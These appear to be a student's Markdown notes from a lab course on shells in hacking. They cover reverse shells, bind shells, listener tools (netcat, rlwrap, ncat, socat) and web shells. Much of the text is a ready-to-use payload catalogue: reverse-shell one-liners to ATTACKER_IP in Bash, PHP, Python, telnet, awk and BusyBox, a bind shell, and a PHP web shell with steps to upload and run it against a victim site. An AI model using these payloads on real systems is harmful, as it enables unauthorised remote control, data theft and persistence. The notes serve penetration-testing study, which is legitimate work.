# 📌 What is a Shell?

A **Shell** is software that acts like a **bridge between the user and the Operating System (OS)**.  
- It takes commands from the user.  
- Passes them to the OS.  
- Then shows the output to the user.  

There are two main types of Shells:
1. **Graphical Shell** → Works with windows, icons, mouse clicks (example: Windows Explorer, macOS Finder).  
2. **Command-Line Shell** → Works with typed commands (example: Bash in Linux, PowerShell in Windows).  



# 🛡️ Shell in Cyber Security

In Cyber Security, the term **Shell** usually means:
👉 An attacker got access to a system and can now type/run commands on that machine.

This is very dangerous because the attacker can now control the target computer.



# 🔑 Common Uses of a Hacked Shell

| Purpose                          | Meaning                                                                 | Example Scenario |
|----------------------------------|-------------------------------------------------------------------------|-----------------|
| **Remote System Control**        | Attacker can run commands/software remotely.                            | Start/stop services on victim system. |
| **Privilege Escalation**         | Try to gain admin/root access if current access is limited.              | Normal user → Admin user. |
| **Data Exfiltration**            | Steal/copy important files/data.                                         | Downloading password files or company data. |
| **Persistence & Maintenance**    | Attacker creates backdoor access for future use.                        | Create a hidden user account or install malware. |
| **Post-Exploitation Activities** | Do more harmful activities after getting access.                        | Deploy ransomware, delete logs, hide tracks. |
| **Access Other Systems**         | Use the compromised system as a "pivot" to hack other systems in network.| Jump from one computer to another in the same office network. |



# 📊 Comparison: Normal Shell vs Hacked Shell

| Feature               | Normal User Shell                   | Attacker’s Shell (Compromised)          |
|-----------------------|--------------------------------------|-----------------------------------------|
| **Who uses it?**      | System user (you, admin, staff).    | Hacker/attacker.                        |
| **Purpose**           | To work and interact with OS.       | To control, steal, or damage system.    |
| **Access level**      | Depends on user login.              | Can start with low access → escalate.   |
| **Risk**              | Safe, normal system operation.      | High risk → Data theft, malware, damage.|



# 📝 Simple Example

- **Normal Shell use (legit):**  
  A user types command to open a file or check internet connection.  

- **Hacked Shell use (illegit):**  
  A hacker types command to copy all passwords from the system and send them to his server.  



# ⚡ Key Takeaway
- Shell = Interface to talk with OS.  
- In hacking, Shell = Attacker's remote access tool.  
- Once an attacker gets a shell → He can control, steal, and spread across the network.  
---
# 🔄 Reverse Shell (Connect Back Shell)

A **Reverse Shell** is a hacking technique where the **target system connects back to the attacker’s system**.  
👉 This helps attackers bypass firewalls and security tools because normally firewalls block incoming traffic but allow outgoing connections.



# ⚙️ How Reverse Shell Works

1. **Attacker sets a listener** (waiting for connections) on his system.  
2. **Target system (victim)** runs a malicious payload (reverse shell command).  
3. Victim’s machine **initiates a connection** back to the attacker’s listener.  
4. Now, attacker can **control the victim’s system** through this connection.



# 🛠️ Example with Netcat (Attacker Side)

Attacker opens a listener (waiting mode):
```
nc -lvnp 443
```
### Breakdown:
- `-l` → Listen mode (wait for connection).  
- `-v` → Verbose (show details).  
- `-n` → Don’t resolve DNS, only use IP.  
- `-p` → Choose the port number (example: 443).  

✅ Common ports used: 53, 80, 8080, 443, 139, 445 (because they look like normal traffic).  



# 💣 Reverse Shell Payload (Victim Side)

Example **Pipe Reverse Shell Payload**:
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc ATTACKER_IP ATTACKER_PORT >/tmp/f
```
### Step-by-Step Explanation:
| Command Part                               | Meaning                                                                 |
|--------------------------------------------|-------------------------------------------------------------------------|
| `rm -f /tmp/f`                             | Remove any old pipe file named **f** in `/tmp/`.                        |
| `mkfifo /tmp/f`                            | Create a new **named pipe** at `/tmp/f` for communication.              |
| `cat /tmp/f`                               | Read input data from the pipe.                                          |
| ` sh -i 2>&1`                             | Send input into an interactive shell, redirecting errors to output.     |
| ` nc ATTACKER_IP ATTACKER_PORT >/tmp/f`   | Send shell output to attacker’s Netcat listener over network.           |
| `>/tmp/f`                                  | Write attacker’s commands back into the pipe (2-way communication).     |



# 📡 Example: Attacker Receives Reverse Shell

Attacker’s terminal shows:
```
attacker@kali:$ nc -lvnp 443
listening on [any] 443 ...
connect to [10.4.99.209] from (UNKNOWN) [10.10.13.37] 59964
target@tryhackme:$
```
✔ This means:  
- Victim machine (10.10.13.37) connected back.  
- Attacker now has shell access to victim system.  
- Attacker can run commands as if logged in locally.  



# 📊 Comparison: Reverse Shell vs Normal Connection

| Feature                  | Normal Connection                        | Reverse Shell (Hacking)                     |
|---------------------------|------------------------------------------|---------------------------------------------|
| **Who starts it?**        | User connects to server (e.g., browsing)| Victim connects to attacker (reversed).     |
| **Firewall visibility**   | Incoming request is checked              | Outgoing request (harder to detect).        |
| **Purpose**               | Normal usage (web, apps)                 | Unauthorized access for attacker.           |



# ⚡ Key Points
- Reverse Shell = Victim connects back to attacker.  
- Helps attacker bypass firewalls.  
- Needs **listener on attacker** and **payload on victim**.  
- Once connected → Attacker can fully control victim system.
---
# 🔗 Bind Shell

A **Bind Shell** is a technique where the **victim machine itself opens a port and waits (listens) for an attacker’s connection**.  
👉 When the attacker connects to that port, a shell session is opened, and the attacker can run commands remotely.  



# ⚙️ When Bind Shell is Useful?
- If the victim system **does not allow outgoing connections**, then reverse shell won’t work.  
- In that case, attacker uses **Bind Shell**, where the victim listens for connections.  

⚠️ Less popular than Reverse Shell because:  
- Victim system must keep the port open.  
- Easier for firewalls/security tools to detect.  



# 🛠️ How Bind Shell Works

1. **Victim (target system)** runs a bind shell payload.  
2. The payload makes the victim’s machine **listen on a port**.  
3. **Attacker connects** to that port using Netcat.  
4. Attacker now gets remote shell access.  



# 💣 Bind Shell Payload (Victim Side)

Example payload:
```
rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
### Step-by-Step Breakdown
| Part of Command                          | Meaning                                                                 |
|------------------------------------------|-------------------------------------------------------------------------|
| `rm -f /tmp/f`                           | Remove any old pipe file in `/tmp/`.                                    |
| `mkfifo /tmp/f`                          | Create a new **named pipe** for communication.                          |
| `cat /tmp/f`                             | Read input data from the pipe.                                          |
| ` bash -i 2>&1`                         | Start an interactive bash shell, redirecting errors to output.          |
| ` nc -l 0.0.0.0 8080`                   | Start Netcat in **listen mode** on port `8080`.                         |
| `>/tmp/f`                                | Send output of commands back into the pipe (2-way communication).       |

👉 After running this, the target system **waits for connections** on port `8080`.  

---

# 📡 Attacker Connects to Bind Shell

On attacker machine, run:
```
nc -nv TARGET_IP 8080
```
### Breakdown:
- `nc` → Start Netcat.  
- `-n` → Don’t use DNS (faster).  
- `-v` → Verbose (show connection info).  
- `TARGET_IP` → Victim’s IP address.  
- `8080` → Port where victim is listening.  

---

# 🖥️ Example Session

Victim starts bind shell:
```
target@tryhackme:~$ rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | bash -i 2>&1 | nc -l 0.0.0.0 8080 > /tmp/f
```
Attacker connects:
```
attacker@kali:$ nc -nv 10.10.13.37 8080
(UNKNOWN) [10.10.13.37] 8080 (http-alt) open
target@tryhackme:$
```
✔ Now attacker has shell access to victim system.  



# 📊 Reverse Shell vs Bind Shell (Comparison)

| Feature              | Reverse Shell                               | Bind Shell                             |
|----------------------|---------------------------------------------|-----------------------------------------|
| **Who connects?**    | Victim connects back to attacker.           | Attacker connects to victim.            |
| **Firewall bypass**  | Easier (looks like normal outgoing traffic).| Harder (open port is more detectable).  |
| **Use case**         | When victim can make outgoing connections.  | When victim cannot make outgoing connections. |
| **Popularity**       | Very popular.                               | Less popular.                           |



# ⚡ Key Points
- Bind Shell = Victim opens port and waits for attacker.  
- Attacker connects and gains remote shell.  
- Easier to detect than reverse shell.  
- Useful when victim blocks outgoing traffic.
---
# 🎧 Tools for Listening to Reverse Shells

In earlier tasks, we saw how **Netcat** can be used to listen for reverse shells.  
But Netcat is not the only tool! There are other utilities that can make reverse shell sessions more powerful and flexible.

Here are some commonly used tools:



# 1️⃣ Rlwrap

**Rlwrap** = "ReadLine Wrapper"  
- Small utility that improves interaction with Netcat shells.  
- Allows features like:
  - Using arrow keys (up/down for history).  
  - Command editing.  
  - Better user experience.  

### Example Usage (Enhancing Netcat):
```
rlwrap nc -lvnp 443
```
✔ This command wraps Netcat inside `rlwrap`.  
Now attacker can use **arrow keys and command history** in the reverse shell session.  



# 2️⃣ Ncat

**Ncat** = Improved version of Netcat (from the **Nmap Project**).  
- Provides **extra features**:
  - Supports **SSL encryption**.  
  - More reliable and secure than normal Netcat.  

### Example: Listen for Reverse Shell
```
ncat -lvnp 4444
```
✔ Starts a listener on port `4444`.  



### Example: Listen with SSL (Encrypted Communication)
```
ncat --ssl -lvnp 4444
```
✔ Adds **SSL encryption**, making traffic harder to detect by security tools.  
- Generates a temporary RSA key.  
- You can also use permanent SSL certificates with options `--ssl-key` and `--ssl-cert`.  



# 3️⃣ Socat

**Socat** = "Socket Cat" (like Netcat but more advanced).  
- Can create socket connections between two data sources.  
- Supports many protocols (TCP, UDP, SSL, etc).  
- Very flexible for networking and reverse shell handling.  

### Example: Listen for Reverse Shell
```
socat -d -d TCP-LISTEN:443 STDOUT
```
### Breakdown:
- `-d` → Enable debug messages (verbosity).  
- `-d -d` → Even more verbose output.  
- `TCP-LISTEN:443` → Start a TCP listener on port `443`.  
- `STDOUT` → Print all received data directly to the terminal.  



# 📊 Comparison of Listener Tools

| Tool     | Key Feature(s)                           | When to Use |
|----------|-------------------------------------------|-------------|
| **Netcat** | Simple, classic listener.                 | Quick & basic reverse shells. |
| **Rlwrap** | Adds readline features to Netcat.         | When you want command history & arrow keys. |
| **Ncat**   | Advanced Netcat with SSL support.         | Secure/encrypted reverse shells. |
| **Socat**  | Very flexible, supports many protocols.   | Complex setups & advanced shells. |



# ⚡ Key Takeaways
- **Netcat** is the classic, but limited.  
- **Rlwrap** improves usability (arrow keys, history).
---
# 💣 Shell Payloads (Linux Examples)

A **Shell Payload** is a command or script that exposes a shell:  
- **Bind Shell** → Victim *listens* for attacker’s connection.  
- **Reverse Shell** → Victim *sends* connection back to attacker.  

Here are common reverse shell payloads in **Linux OS** using different languages.



# 🐚 Bash Reverse Shells

### 1. Normal Bash Reverse Shell
```
bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
```
- Opens an interactive Bash shell.  
- Redirects input/output via TCP to attacker IP:443.  
- `>&` combines output + errors into one stream.  



### 2. Bash Read Line Reverse Shell
```
exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
```
- Creates **file descriptor 5** for TCP socket.  
- Reads commands from attacker, executes, sends results back.  



### 3. Bash FD 196 Reverse Shell
```
0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
```
- Uses **FD 196** to establish TCP connection.  
- Runs shell using that file descriptor.  



### 4. Bash FD 5 Reverse Shell
```
bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
```
- Opens interactive shell.  
- Uses **FD 5** to handle input/output redirection.  



# 🐘 PHP Reverse Shells

### 1. PHP exec()
```
php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
```
- Opens socket to attacker.  
- Runs shell via `exec()`.  



### 2. PHP shell_exec()
```
php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
```
- Same as above, but uses `shell_exec()`.  



### 3. PHP system()
```
php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
```
- Uses `system()` function.  
- Directly shows command output.  



### 4. PHP passthru()
```
php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
```
- Executes command and sends raw output.  
- Good for binary data.  



### 5. PHP popen()
```
php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3","r");'
```
- Opens process file pointer using `popen()`.  
- Executes shell via socket.  



# 🐍 Python Reverse Shells

### 1. Using Environment Variables
```
export RHOST="ATTACKER_IP"; export RPORT=443;
python -c 'import sys,socket,os,pty;
s=socket.socket();
s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];
pty.spawn("bash")'
```
- Stores IP/port in variables.  
- Connects to attacker.  
- Duplicates file descriptors → full shell access.  



### 2. Using subprocess Module
```
python -c 'import socket,subprocess,os;
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);
s.connect(("ATTACKER_IP",443));
os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);
import pty; pty.spawn("bash")'
```
- Connects socket.  
- Redirects stdin/stdout/stderr.  
- Spawns interactive shell.  



### 3. Short Python Reverse Shell
```
python -c 'import os,pty,socket;
s=socket.socket();
s.connect(("ATTACKER_IP",443));
[os.dup2(s.fileno(),f) for f in (0,1,2)];
pty.spawn("bash")'
```
- Shorter version.  
- Same logic: socket + redirect + interactive shell.  



# ⚙️ Other Payloads

### 1. Telnet Reverse Shell
```
TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
```
- Creates named pipe.  
- Uses **Telnet** to connect attacker on port 443.  
- Executes shell through pipe.  



### 2. AWK Reverse Shell
```
awk 'BEGIN {s="/inet/tcp/0/ATTACKER_IP/443";
while(42){do{printf "shell>"|&s; s|&getline c; if(c){while((c|&getline)>0)print $0|&s; close(c);}}while(c!="exit") close(s);}}' /dev/null
```
- Uses AWK’s built-in TCP support.  
- Reads commands → executes → sends back results.  



### 3. BusyBox Reverse Shell
```
busybox nc ATTACKER_IP 443 -e sh
```
- Uses **BusyBox’s Netcat**.  
- Connects to attacker and executes `/bin/sh`.  



# 📊 Summary Table (Quick Reference)

| Language/Tool | Example Style                                | Key Idea                              |
|---------------|-----------------------------------------------|----------------------------------------|
| **Bash**      | `/dev/tcp/...` + file descriptors            | Uses TCP sockets + bash redirection.   |
| **PHP**       | `fsockopen()` + exec/system/shell_exec/etc.  | Opens socket, runs shell command.      |
| **Python**    | `socket + os.dup2()`                         | Connects, redirects IO, spawns bash.   |
| **Telnet**    | `telnet ATTACKER_IP port` + pipe             | Uses Telnet to connect.                |
| **AWK**       | `/inet/tcp/...`                              | Leverages AWK’s TCP capability.        |
| **BusyBox**   | `busybox nc ... -e sh`                       | Lightweight reverse shell with nc.     |



# ⚡ Key Takeaways
- Payload = script/command that exposes shell.  
- Many languages/tools support reverse shells.  
- Attackers pick based on what’s available on target system (Bash, PHP, Python, etc).
---
# 🌐 Web Shell

A **Web Shell** is a malicious script uploaded to a **compromised web server** that allows attackers to execute system commands through the server.  

- Works like a "backdoor" via the web server.  
- Usually uploaded by exploiting **File Upload Vulnerability, File Inclusion, Command Injection, or weak credentials**.  
- Can be **hidden inside web applications** (hard to detect).  

---

# 🖥️ How a Web Shell Works
1. Attacker uploads a malicious script (PHP, ASP, JSP, CGI, etc).  
2. Script is accessible through a browser (HTTP request).  
3. Attacker passes commands (GET/POST parameters).  
4. Web server executes those commands and returns results.  

---

# 🐘 Example: PHP Web Shell

### Code:
```php
<?php
if (isset($_GET['cmd'])) {
    system($_GET['cmd']);
}
?>
```
**Steps:**

- Save this file as shell.php.
- Upload it to victim’s server (http://victim.com/uploads/shell.php).
- Execute commands by adding ?cmd= parameter in URL.
### ✅ Example:
```
http://victim.com/uploads/shell.php?cmd=whoami
```
✔ Runs the whoami command and shows result in the browser.
## 📊 Web Shell Characteristics
Feature	|Description
|----|---|
Languages|	PHP, ASP, JSP, CGI, Python, etc.
Access Method|	Browser via HTTP (GET/POST requests).
Common Exploits	|File upload, inclusion, injection, stolen credentials.
Usage|	Execute commands, manage files, maintain persistence.
Stealth	|Can be hidden inside legit-looking files (e.g. image.php).
## ⚡ Popular Web Shells Found Online
1. p0wny-shell
- Minimalistic, single PHP file.
- Provides command execution via browser.
- Interface looks like a simple terminal.
2. b374k shell
- Feature-rich PHP web shell.
- Includes file management, command execution, and more.
- GUI is like a file explorer + terminal.
3. c99 shell
- Very famous, powerful web shell.
- Supports command execution, file manipulation, and system control.
- Often used in advanced attacks.
## 🔑 Key Takeaways
- A Web Shell = Backdoor on web server.
- Lets attackers execute commands via browser.
- Hard to detect if hidden well.
- Popular web shells (p0wny, b374k, c99) provide full control and file management.
---
